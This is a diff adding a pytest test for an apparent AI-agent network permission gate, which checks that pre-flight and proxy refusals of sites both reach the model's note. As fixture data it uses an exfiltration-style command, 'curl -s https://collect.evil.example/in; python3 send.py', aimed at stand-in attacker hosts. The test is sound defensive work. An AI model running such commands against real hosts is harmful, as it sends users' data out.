@@ -94,6 +94,28 @@ async def test_a_no_up_front_runs_the_command_without_the_grant_and_says_so(exec
         assert await permission_store.find_grant(db, "c1", None, "network", SITE) is None
 
 
+async def test_a_site_refused_up_front_and_another_refused_at_the_proxy_are_both_in_the_models_note(execution_db,
+                                                                                                    monkeypatch):
+    """One run: the pre-flight's no for the site its text names (it runs without it), and the card after the run for a
+    site it reached that its text doesn't name (a script's, scheme-less). The model reads both, neither overwriting the
+    other (tool_execute)."""
+    from tests.server.test_net_a_gate import REFUSED
+    monkeypatch.setattr(untrusted, "_note_outside", lambda c, t: net_policy.note_outside(c, t + " drop.evil.example"))
+
+    class _PerSite(_Asker):
+        async def __call__(self, frame):
+            self.approve = frame["target"] == "network:drop.evil.example"
+            return await super().__call__(frame)
+    asker = _PerSite()
+    command = "curl -s https://collect.evil.example/in; python3 send.py"
+    ex, result = await _after_outside_content(monkeypatch, command, asker=asker, network=True, why="sends the notes",
+                                              executor=_Exec({**REFUSED, "net_refused": ["drop.evil.example"]}))
+    assert [f["target"] for f in asker.frames] == [SITE, "network:drop.evil.example"] and len(ex.runs) == 1
+    note = result["network_note"]
+    assert note.startswith("collect.evil.example was refused") and "The command ran without it" in note
+    assert note.endswith("The user allowed drop.evil.example for this conversation: run the command again.")
+
+
 # ── and only then ────────────────────────────────────────────────────────────
 
 async def test_no_card_for_a_named_listed_package_or_unknown_host(execution_db, monkeypatch):
